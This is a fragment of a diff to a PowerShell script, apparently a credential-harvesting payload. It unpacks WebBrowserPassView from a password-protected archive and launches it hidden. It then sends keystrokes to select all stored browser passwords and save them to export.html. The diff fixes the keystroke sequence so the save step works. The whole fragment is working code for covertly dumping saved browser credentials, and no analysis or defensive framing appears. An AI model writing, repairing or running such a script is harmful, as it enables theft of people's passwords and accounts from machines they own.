@@ -29,15 +29,19 @@ $sevenZipPath = '.\7z\7za.exe'
 Start-Process -FilePath $sevenZipPath -ArgumentList "e", $wbpvZip, "-p$extractionPassword" -Wait
 
 Start-Process -FilePath '.\WebBrowserPassView.exe' -WindowStyle Hidden
+
 Add-Type -AssemblyName System.Windows.Forms
+
 Start-Sleep -Seconds 3
 
 [System.Windows.Forms.SendKeys]::SendWait('^a')  # CTRL + A
 [System.Windows.Forms.SendKeys]::SendWait('^s')  # CTRL + S
+
 Start-Sleep -Seconds 3
+
 [System.Windows.Forms.SendKeys]::SendWait('export.html')
-[System.Windows.Forms.SendKeys]::SendWait('{TAB}')
-[System.Windows.Forms.SendKeys]::SendWait('h')
+[System.Windows.Forms.SendKeys]::SendWait('{TAB}')  # Navigate to the Save button
+[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')  # Press Enter to save
 
 Start-Sleep -Seconds 3
 
